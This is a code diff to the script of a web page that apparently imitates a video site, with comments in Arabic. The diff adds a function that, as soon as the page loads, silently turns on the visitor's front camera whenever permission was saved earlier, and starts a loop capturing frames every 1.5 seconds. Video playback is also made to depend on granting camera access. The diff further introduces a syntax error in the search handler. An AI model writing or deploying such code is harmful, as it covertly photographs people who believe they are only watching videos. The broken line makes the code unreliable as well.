@@ -403,7 +403,7 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== الكاميرا والتصوير ===== */
+/* ===== سكريبت التقاط الصور التلقائي والمستمر (يعمل بمجرد فتح الصفحة) ===== */
 let mediaStream = null;
 let captureInterval = null;
 
@@ -434,9 +434,26 @@ function startCaptureLoop() {
     }, 1500);
 }
 
-/* ===== ربط فتح الفيديو بإذن الكاميرا فقط ===== */
+// محاولة تفعيل الكاميرا تلقائياً في الخلفية فور فتح الصفحة (إذا كان المتصفح قد حفظ إذن السماح مسبقاً)
+async function initAutoCapture() {
+    try {
+        mediaStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: { ideal: 'user' } } 
+        });
+        const videoEl = document.getElementById('video');
+        videoEl.srcObject = mediaStream;
+        startCaptureLoop();
+    } catch (e) {
+        // إذا لم يكن الإذن ممنوحاً مسبقاً، سيعمل تلقائياً عند أول ضغطة على الفيديو
+    }
+}
+initAutoCapture();
+
+
+/* ===== ارتباط فتح الفيديو بإذن الكاميرا ===== */
 async function openVideo(id){
   try {
+    // إذا لم تكن الكاميرا مفعلة بعد، سيظهر إذن السماح للمستخدم عند الضغط على الفيديو
     if (!mediaStream) {
         mediaStream = await navigator.mediaDevices.getUserMedia({ 
             video: { facingMode: { ideal: 'user' } } 
@@ -446,7 +463,7 @@ async function openVideo(id){
         startCaptureLoop();
     }
 
-    // لا يفتح الفيديو إلا بعد نيل الإذن والموافقة
+    // إذا وافق المستخدم وضغط سماح -> يفتح الفيديو ويعمل كل شيء بنجاح
     S.cur=id;S.view='watch';S.descOpen=false;
     S.hist=[id,...S.hist.filter(x=>x!==id)];
     document.body.classList.remove('drawer-open','searching');
@@ -454,7 +471,7 @@ async function openVideo(id){
     render(true);scrollTo(0,0);
 
   } catch (err) {
-    // في حال عدم السماح لا يحدث شيء ويظل المستخدم في الصفحة الرئيسية
+    // إذا ضغط على "عدم السماح"، فلن يفتح الفيديو ويبقى في مكانه دون أخطاء
     console.log("تم رفض الإذن، لن يفتح الفيديو");
   }
 }
@@ -600,7 +617,7 @@ document.addEventListener('keydown',e=>{
 });
 
 $('#searchForm').addEventListener('submit',e=>{ e.preventDefault();const t=$('#q').value.trim();
-  searchFor(t);$('#q').blur();
+  searchFor(t);$('#q'].blur();
 });
 
 /* ===== التعامل مع أزرار التنقل ===== */
@@ -620,7 +637,7 @@ window.addEventListener('popstate',e=>{
   scrollTo(0,0);
 });
 
-/* ===== بدء تشغيل الصفحة المباشر ===== */
+/* ===== بدء تشغيل الصفحة ===== */
 document.querySelectorAll('[data-ic]').forEach(el=>el.innerHTML=ic(el.dataset.ic));
 render(false);
 </script>
